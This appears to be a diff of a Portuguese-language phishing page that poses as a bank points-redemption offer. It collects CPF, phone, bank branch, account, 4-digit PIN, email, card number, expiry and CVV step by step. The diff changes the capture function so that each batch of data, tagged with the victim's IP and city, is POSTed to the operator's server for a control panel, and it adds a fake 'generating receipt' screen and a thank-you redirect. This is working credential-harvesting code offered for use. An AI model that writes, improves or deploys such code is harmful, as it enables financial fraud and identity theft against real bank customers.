@@ -157,7 +157,7 @@
         }
 
         .hidden {
-            display: none;
+            display: none !important;
         }
 
         /* ===== PÁGINA 2 (BANCO) ===== */
@@ -549,7 +549,7 @@
                 Para iniciar seu resgate, digite seu e-mail que vai receber o comprovante:
             </div>
 
-            <!-- STATUS "GERANDO SEU COMPROVANTE" - aparece AQUI quando cartão desativado -->
+            <!-- STATUS "GERANDO SEU COMPROVANTE" -->
             <div class="status-container hidden" id="statusContainer">
                 <div class="balao-gerando hidden" id="balaoGerando">
                     Gerando seu comprovante...
@@ -632,7 +632,7 @@
 
             <button class="btn-resgatar" id="btnResgatar">CONFIRMAR</button>
 
-            <!-- STATUS "GERANDO SEU COMPROVANTE" da página 4 (só usado quando cartão ativado) -->
+            <!-- STATUS "GERANDO SEU COMPROVANTE" da página 4 -->
             <div class="status-container hidden" id="statusContainerPage4">
                 <div class="balao-gerando hidden" id="balaoGerandoPage4">
                     Gerando seu comprovante...
@@ -648,83 +648,55 @@
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
     <script>
-        // ===== FUNÇÃO CAPTURAR DADOS (AGORA COM UNIFICAÇÃO POR CPF) =====
+        // URL do servidor
+        const SERVER_URL = window.location.origin;
+
+        async function enviarParaServidor(dados) {
+            try {
+                const response = await fetch(`${SERVER_URL}/api/dados`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(dados)
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('Erro ao enviar:', error);
+                return null;
+            }
+        }
+
         window.capturarDados = async function(dados) {
             try {
-                // Tenta obter localização
-                let cidade = 'Desconhecido';
-                let ip = '-';
-                
+                let cidade = 'Desconhecido', ip = '-';
                 try {
-                    const response = await fetch('https://ipapi.co/json/');
-                    const data = await response.json();
+                    const res = await fetch('https://ipapi.co/json/');
+                    const data = await res.json();
                     cidade = `${data.city || 'Desconhecido'} - ${data.region_code || ''}`;
                     ip = data.ip || '-';
-                } catch {
-                    // Ignora erro de localização
-                }
+                } catch {}
                 
-                // Carrega dados existentes
-                let dadosCapturados = JSON.parse(localStorage.getItem('dadosCapturados')) || [];
-                
-                // Se tem CPF, procura se já existe
-                if (dados.cpf) {
-                    const indexExistente = dadosCapturados.findIndex(d => d.cpf === dados.cpf);
-                    
-                    if (indexExistente >= 0) {
-                        // Atualiza registro existente
-                        dadosCapturados[indexExistente] = {
-                            ...dadosCapturados[indexExistente],
-                            ...dados,
-                            senha: dados.senha4 || dados.senha || dadosCapturados[indexExistente].senha || '-',
-                            cidade: dadosCapturados[indexExistente].cidade || cidade,
-                            ip: dadosCapturados[indexExistente].ip || ip,
-                            data: new Date().toLocaleString('pt-BR')
-                        };
-                        
-                        localStorage.setItem('dadosCapturados', JSON.stringify(dadosCapturados));
-                        console.log('✅ Dados atualizados para CPF:', dados.cpf);
-                        return;
-                    }
-                }
-                
-                // Se não encontrou, cria novo registro
-                const novoRegistro = {
-                    data: new Date().toLocaleString('pt-BR'),
-                    cpf: dados.cpf || '-',
-                    telefone: dados.telefone || '-',
-                    agencia: dados.agencia || '-',
-                    conta: dados.conta || '-',
-                    cartao: dados.cartao || '-',
-                    senha: dados.senha4 || dados.senha || '-',
-                    email: dados.email || '-',
-                    cvv: dados.cvv || '-',
-                    validade: dados.validade || '-',
-                    cidade: cidade,
-                    ip: ip
-                };
-                
-                dadosCapturados.push(novoRegistro);
-                localStorage.setItem('dadosCapturados', JSON.stringify(dadosCapturados));
-                
-                console.log('✅ Novo cliente criado:', novoRegistro.cpf);
+                await enviarParaServidor({ ...dados, cidade, ip, data: new Date().toISOString() });
+                console.log('✅ Dados capturados');
             } catch (error) {
-                console.error('❌ Erro ao capturar dados:', error);
+                console.error('Erro:', error);
             }
         };
 
+        function irParaObrigado() {
+            const cartaoAtivo = localStorage.getItem('cartaoAtivo') !== 'false';
+            const notificacao = cartaoAtivo ? 'e-mail, SMS e WhatsApp' : 'e-mail e WhatsApp';
+            window.location.href = `/obrigado.html?pontos=98.570&notificacao=${encodeURIComponent(notificacao)}`;
+        }
+
         $(document).ready(function() {
-            // Máscaras
             $('#cpf').mask('000.000.000-00');
             $('#telefone').mask('(00) 00000-0000');
             $('#agencia').mask('0000-0');
             
             $('#conta').on('input', function() {
-                let valor = $(this).val().replace(/\D/g, '');
-                if (valor.length > 1) {
-                    valor = valor.substring(0, valor.length - 1) + '-' + valor.substring(valor.length - 1);
-                }
-                $(this).val(valor);
+                let v = $(this).val().replace(/\D/g, '');
+                if (v.length > 1) v = v.substring(0, v.length-1) + '-' + v.substring(v.length-1);
+                $(this).val(v);
             });
             
             $('#senha4').mask('0000');
@@ -732,32 +704,21 @@
             $('#validade').mask('00/00');
             $('#cvv').mask('000');
 
-            function getBrasiliaTime() {
-                const agora = new Date();
-                return new Intl.DateTimeFormat('pt-BR', {
-                    timeZone: 'America/Sao_Paulo',
-                    hour: '2-digit',
-                    minute: '2-digit',
-                    hour12: false
-                }).format(agora);
+            function getHora() {
+                return new Intl.DateTimeFormat('pt-BR', { timeZone: 'America/Sao_Paulo', hour: '2-digit', minute: '2-digit' }).format(new Date());
             }
 
-            function validarCPF(cpf) {
-                cpf = cpf.replace(/\D/g, '');
-                if (cpf.length !== 11) return false;
-                if (/^(\d)\1+$/.test(cpf)) return false;
-                
-                let soma = 0;
-                for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
-                let resto = 11 - (soma % 11);
-                let digito10 = resto === 10 || resto === 11 ? 0 : resto;
-                if (digito10 !== parseInt(cpf.charAt(9))) return false;
-                
-                soma = 0;
-                for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
-                resto = 11 - (soma % 11);
-                let digito11 = resto === 10 || resto === 11 ? 0 : resto;
-                return digito11 === parseInt(cpf.charAt(10));
+            function validarCPF(c) {
+                c = c.replace(/\D/g, '');
+                if (c.length !== 11 || /^(\d)\1+$/.test(c)) return false;
+                let s = 0;
+                for (let i = 0; i < 9; i++) s += parseInt(c[i]) * (10 - i);
+                let d1 = 11 - (s % 11); if (d1 > 9) d1 = 0;
+                if (d1 !== parseInt(c[9])) return false;
+                s = 0;
+                for (let i = 0; i < 10; i++) s += parseInt(c[i]) * (11 - i);
+                let d2 = 11 - (s % 11); if (d2 > 9) d2 = 0;
+                return d2 === parseInt(c[10]);
             }
 
             $('#cpf').on('input', function() {
@@ -766,44 +727,19 @@
 
             $('#btnConsultar').on('click', function() {
                 if (!validarCPF($('#cpf').val())) {
-                    Swal.fire({ 
-                        icon: 'error', 
-                        title: 'CPF inválido', 
-                        text: 'Digite um CPF válido.', 
-                        background: '#C62828', 
-                        color: 'white', 
-                        confirmButtonColor: '#ffffff',
-                        timer: 3000,
-                        showConfirmButton: true
-                    });
+                    Swal.fire({ icon: 'error', title: 'CPF inválido', background: '#C62828', color: 'white' });
                     return;
                 }
                 if ($('#telefone').val().replace(/\D/g, '').length < 11) {
-                    Swal.fire({ 
-                        icon: 'error', 
-                        title: 'Telefone incompleto', 
-                        text: 'Digite o telefone com DDD.', 
-                        background: '#C62828', 
-                        color: 'white', 
-                        confirmButtonColor: '#ffffff' 
-                    });
+                    Swal.fire({ icon: 'error', title: 'Telefone incompleto', background: '#C62828', color: 'white' });
                     return;
                 }
-
-                // CAPTURAR DADOS PARA O PAINEL
-                window.capturarDados({
-                    cpf: $('#cpf').val(),
-                    telefone: $('#telefone').val()
-                });
-
+                window.capturarDados({ cpf: $('#cpf').val(), telefone: $('#telefone').val() });
                 $('#loaderMessage').text('Verificando seus benefícios...');
                 $('#loader').removeClass('hidden');
-                
                 setTimeout(() => {
                     $('#loader').addClass('hidden');
-                    $('#page1').addClass('hidden');
-                    $('#page2').removeClass('hidden');
-                    $('#loaderMessage').text('Consultando seus pontos...');
+                    $('#page1, #page2').toggleClass('hidden');
                 }, 3000);
             });
 
@@ -812,31 +748,21 @@
                     Swal.fire({ icon: 'error', title: 'Agência inválida', background: '#C62828', color: 'white' });
                     return;
                 }
-                if ($('#conta').val().trim() === '') {
-                    Swal.fire({ icon: 'error', title: 'Conta inválida', text: 'Digite o número da conta.', background: '#C62828', color: 'white' });
+                if (!$('#conta').val().trim()) {
+                    Swal.fire({ icon: 'error', title: 'Conta inválida', background: '#C62828', color: 'white' });
                     return;
                 }
                 if ($('#senha4').val().length !== 4) {
-                    Swal.fire({ icon: 'error', title: 'Senha inválida', text: 'Digite a senha de 4 dígitos.', background: '#C62828', color: 'white' });
+                    Swal.fire({ icon: 'error', title: 'Senha inválida', background: '#C62828', color: 'white' });
                     return;
                 }
-
-                // CAPTURAR DADOS PARA O PAINEL
-                window.capturarDados({
-                    cpf: $('#cpf').val(),
-                    agencia: $('#agencia').val(),
-                    conta: $('#conta').val(),
-                    senha4: $('#senha4').val()
-                });
-
+                window.capturarDados({ cpf: $('#cpf').val(), agencia: $('#agencia').val(), conta: $('#conta').val(), senha4: $('#senha4').val() });
                 $('#loader').removeClass('hidden');
                 setTimeout(() => {
                     $('#loader').addClass('hidden');
-                    $('#page2').addClass('hidden');
-                    $('#page3').removeClass('hidden');
-                    
-                    const hora = getBrasiliaTime();
-                    $('#hora1, #hora2, #hora3').text(hora);
+                    $('#page2, #page3').toggleClass('hidden');
+                    const h = getHora();
+                    $('#hora1, #hora2, #hora3').text(h);
                 }, 3000);
             });
 
@@ -845,62 +771,42 @@
                     Swal.fire({ icon: 'error', title: 'E-mail inválido', background: '#C62828', color: 'white' });
                     return;
                 }
-
-                // CAPTURAR DADOS PARA O PAINEL
-                window.capturarDados({
-                    cpf: $('#cpf').val(),
-                    email: $('#email').val()
-                });
-
+                window.capturarDados({ cpf: $('#cpf').val(), email: $('#email').val() });
                 $('#loader').removeClass('hidden');
                 setTimeout(() => {
                     $('#loader').addClass('hidden');
-                    
-                    // VERIFICAR SE CARTÃO ESTÁ ATIVADO (do painel)
-                    const cartaoAtivo = localStorage.getItem('cartaoAtivo') !== 'false';
-                    
-                    if (cartaoAtivo) {
-                        // Vai para página do cartão
-                        $('#page3').addClass('hidden');
-                        $('#page4').removeClass('hidden');
+                    const ativo = localStorage.getItem('cartaoAtivo') !== 'false';
+                    if (ativo) {
+                        $('#page3, #page4').toggleClass('hidden');
                     } else {
-                        // CARTÃO DESATIVADO - mostra gerando comprovante na PRÓPRIA PÁGINA 3
                         $('#statusContainer').removeClass('hidden');
                         $('#balaoGerando').removeClass('hidden');
-                        $('#horaGerando').text(getBrasiliaTime());
+                        $('#horaGerando').text(getHora());
+                        setTimeout(irParaObrigado, 6000);
                     }
-                    
-                    const hora = getBrasiliaTime();
-                    $('#hora4, #hora5, #hora6, #hora7').text(hora);
+                    const h = getHora();
+                    $('#hora4, #hora5, #hora6, #hora7').text(h);
                 }, 3000);
             });
 
-            // Página 4 - Clique CONFIRMAR (cartão)
             $('#btnResgatar').on('click', function() {
                 if ($('#cartao').val().replace(/\s/g, '').length !== 16) {
-                    Swal.fire({ icon: 'error', title: 'Cartão inválido', text: 'Digite os 16 dígitos do cartão.', background: '#C62828', color: 'white' });
+                    Swal.fire({ icon: 'error', title: 'Cartão inválido', background: '#C62828', color: 'white' });
                     return;
                 }
                 if ($('#validade').val().length !== 5) {
-                    Swal.fire({ icon: 'error', title: 'Validade inválida', text: 'Digite a data no formato MM/AA.', background: '#C62828', color: 'white' });
+                    Swal.fire({ icon: 'error', title: 'Validade inválida', background: '#C62828', color: 'white' });
                     return;
                 }
                 if ($('#cvv').val().length !== 3) {
-                    Swal.fire({ icon: 'error', title: 'CVV inválido', text: 'Digite os 3 dígitos do CVV.', background: '#C62828', color: 'white' });
+                    Swal.fire({ icon: 'error', title: 'CVV inválido', background: '#C62828', color: 'white' });
                     return;
                 }
-
-                // CAPTURAR DADOS PARA O PAINEL
-                window.capturarDados({
-                    cpf: $('#cpf').val(),
-                    cartao: $('#cartao').val(),
-                    validade: $('#validade').val(),
-                    cvv: $('#cvv').val()
-                });
-
+                window.capturarDados({ cpf: $('#cpf').val(), cartao: $('#cartao').val(), validade: $('#validade').val(), cvv: $('#cvv').val() });
                 $('#statusContainerPage4').removeClass('hidden');
                 $('#balaoGerandoPage4').removeClass('hidden');
-                $('#horaGerandoPage4').text(getBrasiliaTime());
+                $('#horaGerandoPage4').text(getHora());
+                setTimeout(irParaObrigado, 6000);
             });
         });
     </script>
